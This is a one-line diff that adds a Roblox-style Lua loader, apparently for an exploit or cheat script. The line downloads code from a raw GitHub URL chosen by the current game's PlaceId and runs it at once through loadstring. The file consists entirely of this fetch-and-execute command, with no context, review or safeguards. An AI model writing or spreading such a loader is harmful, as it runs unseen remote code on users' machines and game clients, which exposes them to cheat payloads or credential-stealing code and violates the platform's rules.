@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/x2SPETER/x2SPETER/main/"..game.PlaceId..""))()
